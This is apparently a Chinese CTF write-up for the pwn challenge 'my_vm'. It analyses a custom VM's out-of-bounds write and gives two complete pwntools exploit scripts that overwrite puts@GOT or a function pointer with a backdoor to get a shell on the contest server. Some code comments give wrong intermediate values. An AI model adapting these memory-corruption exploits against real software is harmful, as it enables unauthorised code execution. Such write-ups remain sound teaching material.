---
title: GHCTF my_vm
---
# GHCTF my_vm

## ida分析

### main函数分析
![图片过期](https://img.picui.cn/free/2025/03/07/67cad4a470919.png)

1.存在backdoor()函数，点开发现system("/bin/sh\x00").可以直接利用这个地址0x400877.
2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了
3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。

### execute函数分析
![图片过期](https://img.picui.cn/free/2025/03/07/67cad6af01ff1.png)
![图片过期](https://img.picui.cn/free/2025/03/07/67cad6aee4df5.png)
![图片过期](https://img.picui.cn/free/2025/03/07/67cad7ed8076c.png)
1.首先看，对op的处理，和对op的限制
2.寻找漏洞。option == 0x90 时，可以对memory上的数据作修改
3.基于此，如果`reg[dest]`设置为负数，那么可以完成对其他数据的修改
4.从第三张图，查看option==0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在`reg[]`中写入负数，完成数组的向上越界

## 构造思路
1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行
2.接着读入op。我们需要对op作一点处理，便于控制每一个字节

```python
def Code(op,dest,src1,src2):
    code=(op<<24)+(dest<<16)+(src1<<8)+src2
    io.sendline(str(code))
```
通过样的处理，我们可以控制每个字节，便于准确的控制
3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法
4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以rax*4 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到
5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor
6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.

## exp 

### 修改puts_got
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='node1.anna.nssctf.cn'
port=28844
elf=ELF("./my_vm")
if mode == 0:
    io=process("./my_vm")
else :
    io=remote(url,port)

def Code(op,dest,src1,src2):
    code=(op<<24)+(dest<<16)+(src1<<8)+src2
    io.sendline(str(code))

backdoor=0x400877 # system("/bin/sh\x00")

io.sendlineafter("set your IP:","0")
io.sendlineafter("set your SP:","1")
io.sendlineafter("execve:",str(27))

puts_got=0x602018
offset=0x6020e0-0x602018
reg=0x6420E0
memory=0x6020E0
###


###

### Code 
Code(0x10,0,0,0x8)  # reg[0]=0x8
Code(0x10,1,0,0x4)  # reg[1]=0x4
Code(0x40,2,1,0)    # reg[2]=0xc
Code(0x80,3,2,1)    # reg[3]=reg[1]<<reg[1]  : reg[3]=0xc0
Code(0x10,4,0,0x6)  # reg[4]=0x6
Code(0x40,4,4,0)    # reg[4]=0xe
Code(0x40,3,3,4)    # reg[1]=reg[1]+reg[3]   : reg[3]=0xce      
Code(0x10,5,0,0x7)  # reg[5]=0x7
Code(0x40,5,5,0)    # reg[5]=0xf
Code(0x80,6,5,1)    # reg[6]=reg[5]<<reg[1]  : reg[6]=0xf0
Code(0x40,6,6,5)    # reg[6]=reg[5]+reg[6]   : reg[6]=0xff 
Code(0x80,5,6,0)    # reg[5]=reg[6]<<reg[0]  : reg[5]=0xff00
Code(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffff
Code(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffff00
Code(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff
Code(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffffff00
Code(0x40,5,5,3)    # reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce

#0x400877
Code(0x10,4,0,0x7)  # reg[4]=0x7
Code(0x80,6,4,1)    # reg[6]=reg[4]<<reg[1]  : reg[6]=0x70
Code(0x40,6,6,4)    # reg[6]=reg[6]+reg[4]   : reg[6]=0x770000
Code(0x80,1,1,1)    # reg[1]=reg[1]<<reg[1]  : reg[1]=0x40
Code(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x4000
Code(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x400000
Code(0x80,0,0,0)    # reg[0]=reg[0]<<reg[0]  : reg[0]=0x800
Code(0x40,0,0,6)    # reg[0]=reg[0]+reg[6]   : reg[0]=0x877
Code(0x40,1,1,0)    # reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877
Code(0x90,5,1,0)    # mem[reg[5]]=reg[1]     : mem[-50]=0x4000877
#gdb.attach(io)
io.interactive()
```

### 覆盖func
```python 
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=0
url='node1.anna.nssctf.cn'
port=28844
elf=ELF("./my_vm")
if mode == 0:
    io=process("./my_vm")
else :
    io=remote(url,port)

def Code(op,dest,src1,src2):
    code=(op<<24)+(dest<<16)+(src1<<8)+src2
    io.sendline(str(code))

io.sendlineafter("set your IP:","0")
io.sendlineafter("set your SP:","1")
io.sendlineafter("execve:",str(14))


### Code 
Code(0x10,0,0,8)   #reg[0]=8
Code(0x10,1,0,0)
Code(0x50,1,1,0)   #reg[1]=-8
Code(0x10,2,0,7)   #reg[2]=7
Code(0x10,4,0,4)   #reg[4]=4
Code(0x80,3,2,4)   #reg[3]=0x70
Code(0x40,3,3,2)   #reg[3]=0x77
### backdoor  
Code(0x80,4,4,4)   #reg[4]=0x40
Code(0x80,4,4,0)   #reg[4]=0x4000
Code(0x80,4,4,0)   #reg[4]=0x400000
Code(0x80,0,0,0)   #reg[0]=0x800
Code(0x40,0,0,3)   #reg[0]=0x877
Code(0x40,4,4,0)   #reg[4]=0x400877
Code(0x90,1,4,0)
io.interactive()

```